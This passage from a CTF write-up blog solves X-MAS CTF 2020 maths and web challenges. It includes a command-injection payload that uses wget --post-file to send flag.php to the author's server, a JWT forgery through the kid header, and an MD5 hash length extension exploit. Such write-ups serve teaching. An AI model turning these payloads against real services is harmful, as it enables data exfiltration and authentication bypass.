class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;challs.xmas.htsp.ro&quot;</span>, <span class="number">6050</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;1/100\n&quot;</span>).strip().split()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span>(<span class="params">_count</span>):</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(_count):</span><br><span class="line">        num = r.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&quot;= &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        num1 = r.recvline().decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&quot;= &quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        print(<span class="string">&quot;gcd(x, y) : &quot;</span> + num)</span><br><span class="line">        print(<span class="string">&quot;lcm(x, y) : &quot;</span> + num1)</span><br><span class="line">        s_num = <span class="built_in">int</span>(<span class="built_in">int</span>(num1)//<span class="built_in">int</span>(num))</span><br><span class="line">        cmd = <span class="string">&quot;yafu-x64 factor(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(s_num)</span><br><span class="line">        out = subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line">        check = out.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        length = check.count(<span class="string">&#x27;P&#x27;</span>)</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">            data.append(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">            data[j] = check.split(<span class="string">&#x27;P&#x27;</span>)[i].split(<span class="string">&quot; =&quot;</span>)[<span class="number">1</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;ans&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        b = []</span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">                b.append(data[i])</span><br><span class="line">            <span class="keyword">if</span> i != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>+k,<span class="built_in">len</span>(b)):</span><br><span class="line">                    <span class="keyword">if</span> b[j] != data[i]:</span><br><span class="line">                        b.append(data[i])</span><br><span class="line">                        k += <span class="number">1</span>           </span><br><span class="line">        Count = <span class="built_in">len</span>(b)</span><br><span class="line">        count = <span class="number">2</span>**Count</span><br><span class="line">        print(<span class="string">&quot;Round : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(a+<span class="number">1</span>))</span><br><span class="line">        r.sendline(<span class="built_in">str</span>(count))</span><br><span class="line">        print(r.recvline())</span><br><span class="line">        r.recvline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    go(<span class="number">100</span>)</span><br><span class="line">    print(r.recv())</span><br></pre></td></tr></table></figure><p>I wrote the exploit code as above.<br><img src="https://github.com/wjddnjs33/image/blob/main/KakaoTalk_Photo_2020-12-18-06-22-00.png?raw=true"><br>When I returned the exploit code, I could see the flag appear.</p><blockquote><p>FLAG : X-MAS{gr347es7_c0mm0n_d1v1s0r_4nd_l345t_c0mmon_mult1pl3_4r3_1n73rc0nn3ct3d}</p></blockquote><hr><h2 id="Web-PHP-Master-33-pts"><a href="#Web-PHP-Master-33-pts" class="headerlink" title=" (Web) PHP Master [33 pts]"></a><span style="color:#21C587"></span> (Web) PHP Master [33 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.00.png?raw=true"></p><p>Solve URL : <code>http://challs.xmas.htsp.ro:3000/?param1=1.0&amp;param2=001</code><br></p><blockquote><p>FLAG : X-MAS{s0_php_m4ny_skillz-69acb43810ed4c42}</p></blockquote><hr><h2 id="Web-flag-checker-59-pts"><a href="#Web-flag-checker-59-pts" class="headerlink" title=" (Web) flag_checker [59 pts]"></a><span style="color:#21C587"></span> (Web) flag_checker [59 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.20.png?raw=true"><br>This time, we will solve a problem called <code>flag_checker</code> among web problems in X-MAS CTF 2020.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* flag_checker */</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$example_flag</span> = strtolower(<span class="string">&#x27;FAKE-X-MAS&#123;d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789&#125;&#x27;</span>);</span><br><span class="line">    <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$flag</span>) &amp;&amp; <span class="variable">$valid</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$example_flag</span>, strtolower(<span class="variable">$flag</span>[<span class="variable">$i</span>])) === <span class="literal">false</span>) <span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$valid</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&quot;wget -q -O - https://kuhi.to/flag/&quot;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    <span class="variable">$cmd_output</span> = <span class="keyword">array</span>();</span><br><span class="line">    exec(<span class="variable">$command</span>, <span class="variable">$cmd_output</span>);</span><br><span class="line">    <span class="keyword">if</span>(count(<span class="variable">$cmd_output</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Nope&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Maybe&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!checkFlag(<span class="variable">$flag</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;That is not a correct flag!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getFlag(<span class="variable">$flag</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>When it comes to problems, the above PHP source code exists.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$example_flag</span> = strtolower(<span class="string">&#x27;FAKE-X-MAS&#123;d1s_i\$_a_SaMpL3_Fl4g_n0t_Th3_c0Rr3c7_one_karen_l1k3s_HuMu5.0123456789&#125;&#x27;</span>);</span><br><span class="line">    <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$flag</span>) &amp;&amp; <span class="variable">$valid</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$example_flag</span>, strtolower(<span class="variable">$flag</span>[<span class="variable">$i</span>])) === <span class="literal">false</span>) <span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$valid</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Looking at the checkFlag function, it puts a fake flag in a variable called example_flag, and checks whether the character in $flag is in example_flag.</p><p>If any of the values of $flag are not included in example_flag, False is returned.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"><span class="variable">$flag</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&quot;wget -q -O - https://kuhi.to/flag/&quot;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    <span class="variable">$cmd_output</span> = <span class="keyword">array</span>();</span><br><span class="line">    exec(<span class="variable">$command</span>, <span class="variable">$cmd_output</span>);</span><br><span class="line">    <span class="keyword">if</span>(count(<span class="variable">$cmd_output</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Nope&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Maybe&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The getFlag function receives the $flag value, connects it after the wget command, and sets the output of the exec function as an array.</p><p>Here, if the command executed well, it prints Maybe, and if not, prints Nope.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!checkFlag(<span class="variable">$flag</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;That is not a correct flag!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getFlag(<span class="variable">$flag</span>);</span><br></pre></td></tr></table></figure><p>In the above part, you can see that the flag value is received, the input value is verified using the checkFlag function, and the getFlag function is executed if the filtering does not occur.</p><p>In this problem, the command execution value is not output, so the input value must be retrieved to a private server.</p><p>So, first, let’s check if there is a way to get the php file using the wget command.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.48.39.png?raw=true"><br>When I searched Google for Blind Command Injection, I could see that using the –post-file option of the wget command as above, the file was read and sent as the POST body value.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">80</span>;</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123;</span><br><span class="line">  extended: <span class="literal">true</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;X-MAS!!!!&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(req.body);</span><br><span class="line">res.send();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(PORT, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;--------------------------------&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Listening on port &#x27;</span> + PORT + <span class="string">&#x27;...&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;--------------------------------&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>In order to receive the flag, I built a simple server using Node.js to output the POST body value as above.</p><p><code>Payload : $&#123;IFS&#125;-$&#123;IFS&#125;--post-file$&#123;IFS&#125;flag.php$&#123;IFS&#125;141.164.55.161</code></p><p>So, I passed the payload above as the flag value.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%207.00.30.png?raw=true"><br>When I checked the server log, I could see the flag.php file came.</p><blockquote><p>FLAG : X-MAS{s0_fL4g_M4ny_IFS_bb69cd55f5f6}</p></blockquote><hr><h2 id="Web-X-MAS-Chan-470-pts"><a href="#Web-X-MAS-Chan-470-pts" class="headerlink" title=" (Web) X-MAS Chan [470 pts]"></a><span style="color:#21C587"></span> (Web) X-MAS Chan [470 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.32.png?raw=true"><br>This time, we will solve the problem called <code>X-MAS Chan</code> among web problems from X-MAS CTF 2020.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%209.41.21.png?raw=true"><br>If you come into trouble, you can see there are links and rules that can get you into the board.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%209.43.59.png?raw=true"><br>When I came to the board, I can see that the file upload function exists as above. </p><p>And as a result of checking, it was found that only photos such as jpg, png, and gif can be uploaded.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%209.51.25.png?raw=true"><br>Also, if you check the source code, you can see that there is getbanner.php, and the logic is logic to get a picture using jwt. <code>You can see that jwt is set as a value in a cookie called banner.</code><br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%209.55.11.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;kid&quot;: &quot;&#x2F;tmp&#x2F;jwt.key&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>When the jwt is decoded, you can see that the header part uses the <code>HS256</code> algorithm as above and the kid value is using <code>/tmp/jwt.key</code>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;banner&quot;: &quot;banner&#x2F;11.gif&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As the data above, you can see that you are receiving a 11.gif photo as the value of the banner. So, if you give <code>flag.php</code> as the <code>value of banner</code>, it will read and return <code>flag.php</code>, not the picture. </p><p>So how do I <code>sign</code> JWT when I don’t know the <code>secret key</code>? </p><p>You can think of the kid value in the header as a pointer to the secret key. In the above jwt, since kid points to <code>/tmp/jwt.key</code>, the value contained in jwt.key can be used as the secret key. </p><p>So, upload a photo using the file upload function, and when the kid points to the photo, you can sign using the binary value of the photo.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.04.11.png?raw=true"><br>I will make a gif file as above and use it.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.06.13.png?raw=true"><br>So, when I uploaded the file, you can see the file was created with the path <code>/b/src/1608071199792.gif</code>. Now, if you give the above path as the <code>kid</code> value in the jwt header, you can use the <code>binary value of the above file</code> as the <code>secret key.</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jwt.gif&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    key = fp.read()</span><br><span class="line"></span><br><span class="line">print(jwt.encode(&#123;<span class="string">&#x27;banner&#x27;</span>: <span class="string">&#x27;flag.php&#x27;</span>&#125;, key, algorithm=<span class="string">&#x27;HS256&#x27;</span>, headers=&#123;<span class="string">&#x27;kid&#x27;</span>: <span class="string">&#x27;/var/www/html/b/src/1608071199792.gif&#x27;</span>&#125;))</span><br></pre></td></tr></table></figure><p>I wrote jwt Signing code as above.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.10.23.png?raw=true"><br>If you run the code, you can see jwt appear as above.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.12.08.png?raw=true"><br>When I decode jwt and check it, I can see that the value is well entered.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.16.02.png?raw=true"><br>So when I send a request to getbanner.php using the above jwt, you can see that flag.php is displayed, not the picture.</p><blockquote><p>FLAG : X-MAS{n3v3r_trust_y0ur_us3rs_k1ds-b72dcf5a49498400}</p></blockquote><hr><h2 id="Web-cat-clicker-474-pts"><a href="#Web-cat-clicker-474-pts" class="headerlink" title=" (Web) cat_clicker [474 pts]"></a><span style="color:#21C587"></span> (Web) cat_clicker [474 pts]</h2><p><img src="https://github.com/wjddnjs33/image/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%EC%A0%84%206.25.59.png?raw=true"><br>This time, we will solve the problem called <code>Cat Clicker</code> among web problems from X-MAS CTF 2020.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.43.58.png?raw=true"><br>When it comes to problems, there is logic to buy flags using the number of cats. The fake flag seems to be available for purchase if you have one cat and the real flag is 13 cats.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-18%20%EC%98%A4%ED%9B%84%2010.47.06.png?raw=true"><br>You can increase the number of cats by clicking on the face, but it seems like 12 is the maximum.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">state : 12 | 0</span><br><span class="line">hash : cf13ab76afb625f7f7d6c539c2cb3c84</span><br><span class="line"></span><br><span class="line">state : 12 | 1</span><br><span class="line">hash : e71f77e8f7c2c2957292f4a0e1d79d9d</span><br><span class="line"></span><br><span class="line">(Skip)</span><br><span class="line"></span><br><span class="line">state : 12 | 12</span><br><span class="line">hash : 9579729592f72a075bb61f63b8ea238e</span><br></pre></td></tr></table></figure><p>As above, the number of cats is managed by the hash value, and looking at the hash, it seems to be an md5 hash.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%204.42.16.png?raw=true"><br>And since this web service has a .git directory, you can pull out all the .git trees.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%204.46.13.png?raw=true"><br>I downloaded all the .git trees using gitdumper.sh, and you can lick the source code using the <code>git cat-file -p</code> command.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hashFor</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$secret</span> = getenv(<span class="string">&quot;SECRET_THINGY&quot;</span>); <span class="comment">// 64 random characters - impossible to guess</span></span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;<span class="subst">$secret</span> | <span class="subst">$state</span>&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> md5(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verifyState</span>(<span class="params"><span class="variable">$state</span>, <span class="variable">$hash</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$hash</span> === hashFor(<span class="variable">$state</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCatsNo</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(end(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getParentsLimit</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(reset(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>The above code is the source code of helper.php. If you look at the hashFor function, you are using <code>salt</code>. As such, the hash value cannot be predicted, but you can bypass it using a <code>hash length extension attack</code>. </p><p>Kindly the length of the salt is <code>64</code>, as you can see it shows in the tin. If you don’t know the length of the salt, you need to estimate the length using <code>brute force</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCatsNo</span>(<span class="params"><span class="variable">$state</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$arr</span> = explode(<span class="string">&quot; | &quot;</span>, <span class="variable">$state</span>);</span><br><span class="line"><span class="keyword">return</span> intval(end(<span class="variable">$arr</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>And if you look at the getCatsNo function, you can see that the last value of the array is used as the number of cats by using the end function. </p><p>Therefore, when it becomes “<code>12 | 1 | Null Byte | 1000 |</code>“, <code>1000</code> is used as the number of cats. If there is no logic to fetch only the last value of the array, it won’t work.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%205.10.35.png?raw=true"><br>So, since I know the salt length, I made a payload using <code>hashpump</code>. (<code>URL encoding</code>)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fetch = <span class="built_in">require</span>(<span class="string">&quot;node-fetch&quot;</span>);</span><br><span class="line">fetch(<span class="string">&#x27;http://challs.xmas.htsp.ro:3003/api/buy.php&#x27;</span>, &#123;</span><br><span class="line">    method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    body: <span class="string">&#x27;item_id=2&amp;state=12%20%7C%201%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%02%00%00%00%00%00%00%20%7C%201000&amp;hash=f48ccd5768b829f8856ae186eb4bf4a4&#x27;</span></span><br><span class="line">&#125;).then(<span class="function">(<span class="params">x</span>) =&gt;</span> x.text()).then(<span class="function">(<span class="params">x</span>) =&gt;</span> <span class="built_in">console</span>.log(x));</span><br></pre></td></tr></table></figure><p>As above, I wrote the exploit code using JavaScript.<br><img src="https://github.com/wjddnjs33/image2/blob/main/%EC%8A%A4%ED%81%AC%EB%A6%B0%EC%83%B7%202020-12-19%20%EC%98%A4%EC%A0%84%205.17.01.png?raw=true"><br>Finally, return the exploit code to see the successful purchase of the flag.</p><blockquote><p>FLAG : 